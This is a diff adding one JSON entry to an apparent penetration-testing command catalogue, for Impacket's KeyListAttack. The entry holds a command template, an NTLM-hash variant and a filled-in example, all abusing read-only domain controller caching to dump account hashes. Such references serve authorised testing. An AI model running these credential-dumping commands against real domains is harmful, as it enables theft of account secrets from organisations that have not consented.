@@ -1,0 +1,30 @@
+{
+  "id": "impacket-keylistattack",
+  "name": "Impacket KeyListAttack",
+  "command": "impacket-keylistattack -rodcNo '<rodc_number>' -rodcKey '<aes_key>' '<domain>/<user>:<password>' -dc-ip '<ip>' -full-scan",
+  "description": "Abuse RODC (Read-Only DC) credential caching to retrieve hashes for accounts cached on the RODC",
+  "platform": "linux",
+  "requires": [
+    "password"
+  ],
+  "protocols": [
+    "kerberos"
+  ],
+  "tags": [
+    "impacket",
+    "rodc",
+    "keylist",
+    "credential-dumping",
+    "kerberos"
+  ],
+  "variations": [
+    {
+      "label": "NTLM Hash",
+      "requires": "hash",
+      "command": "impacket-keylistattack -rodcNo '<rodc_number>' -rodcKey '<aes_key>' -hashes ':<hash>' '<domain>/<user>' -dc-ip '<ip>' -full-scan"
+    }
+  ],
+  "examples": [
+    "impacket-keylistattack -rodcNo '17185' -rodcKey 'aabbcc...' 'CORP.LOCAL/rodcadmin:password' -dc-ip '192.168.1.100' -full-scan"
+  ]
+}
